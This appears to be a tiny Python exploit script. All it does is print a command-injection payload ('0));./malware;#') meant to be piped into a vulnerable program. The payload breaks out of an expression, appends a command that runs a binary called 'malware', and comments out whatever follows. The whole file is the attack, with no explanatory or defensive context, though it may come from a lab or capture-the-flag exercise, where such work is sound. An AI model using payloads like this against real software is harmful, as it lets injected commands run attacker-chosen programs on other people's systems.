#!/usr/bin/env python3
import sys

payload = b"0));./malware;#\n"

sys.stdout.buffer.write(payload)
